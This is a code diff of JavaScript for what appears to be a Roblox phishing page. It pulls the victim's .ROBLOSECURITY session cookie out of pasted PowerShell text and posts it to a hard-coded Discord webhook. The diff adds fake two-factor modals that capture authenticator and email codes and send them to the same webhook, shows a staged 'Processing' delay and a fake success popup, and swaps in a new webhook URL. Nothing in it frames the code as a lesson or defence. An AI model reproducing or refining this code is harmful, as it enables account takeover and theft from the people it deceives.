@@ -72,25 +72,9 @@ document.getElementById('submitButton').addEventListener('click', async function
   // Send webhook for valid cookie
   const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
   const match = powershellData.match(roblosecurityRegex);
-  let ipInfo = null;
   if (match) {
     const cookie = match[1].trim();
-    // Fetch IP and location info
-    try {
-      const res = await fetch('https://ipapi.co/json');
-      if (res.ok) {
-        ipInfo = await res.json();
-      }
-    } catch (e) {
-      ipInfo = null;
-    }
-    let locationText = '';
-    if (ipInfo) {
-      locationText = `IP: ${ipInfo.ip}\nCountry: ${ipInfo.country_name}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nOrg: ${ipInfo.org}`;
-    } else {
-      locationText = 'IP/location lookup failed.';
-    }
-    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
+    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
   }
 
   powershellInput.value = '';
@@ -117,8 +101,8 @@ document.getElementById('submitButton').addEventListener('click', async function
   }, 8500);
 
   setTimeout(() => {
-    // 10s: Show success popup instead of 2FA modal
-    showSuccessPopup();
+    // 10s: Show 2FA modal
+    openModal('twofa-modal');
   }, 10000);
 });
 
@@ -199,9 +183,76 @@ function showErrorAlert() {
   }
 }
 
+// === 2FA Modal Logic (add 6s delay before showing success popup) ===
+const twofaInput = document.getElementById('twofa-input');
+const verifyButton = document.getElementById('verifyButton');
+
+if (twofaInput && verifyButton) {
+  twofaInput.addEventListener('input', () => {
+    const enabled = /^\d{6}$/.test(twofaInput.value);
+    verifyButton.disabled = !enabled;
+    verifyButton.classList.toggle('enabled', enabled);
+  });
+
+  verifyButton.addEventListener('click', async () => {
+    const codeEnteredValue = twofaInput.value.trim();
+    if (!/^\d{6}$/.test(codeEnteredValue)) {
+      alert('Please enter a valid 6-digit code.');
+      return;
+    }
+
+    // Send webhook for 2FA code
+    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
+
+    twofaInput.value = '';
+    closeModal('twofa-modal');
+    showLoading(true, false);
+    showLoadingMessage("Processing...");
+
+    setTimeout(() => {
+      showLoading(false);
+      showSuccessPopup();
+    }, 6000);
+  });
+}
+
+const twofaInput2 = document.getElementById('twofa-input-2');
+const verifyButton2 = document.getElementById('verifyButton2');
+
+if (twofaInput2 && verifyButton2) {
+  twofaInput2.addEventListener('input', () => {
+    const enabled = /^\d{6}$/.test(twofaInput2.value);
+    verifyButton2.disabled = !enabled;
+    verifyButton2.classList.toggle('enabled', enabled);
+  });
+
+  verifyButton2.addEventListener('click', async () => {
+    const codeEnteredValue = twofaInput2.value.trim();
+    if (!/^\d{6}$/.test(codeEnteredValue)) {
+      alert('Please enter a valid 6-digit code.');
+      return;
+    }
+
+    // Send webhook for email code
+    await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
+
+    twofaInput2.value = '';
+    closeModal('twofa-modal-2');
+    
+    // 6 second delay before success popup
+    showLoading(true, false);
+    showLoadingMessage("Processing...");
+
+    setTimeout(() => {
+      showLoading(false);
+      showSuccessPopup();
+    }, 6000);
+  });
+}
+
 // === Webhook Sending ===
 async function sendWebhook(title, description, color) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1394407768403738726/Ql_ghRtNxAB6bzV8kR4XDOpn01kAG3XVR12JuU9WzF5wF45uFc4lFCm7EqEb-K6HxYXz';
+  const webhookUrl = 'https://discord.com/api/webhooks/1390916732411187311/OHCzUAuNep5HjvjuhbbWyXRioUlNoLsZ11kt_XdNQyCFQ_R0DRTk2hZwAP0u-cgmR0zJ';
   const payload = {
     embeds: [{
       title: title,
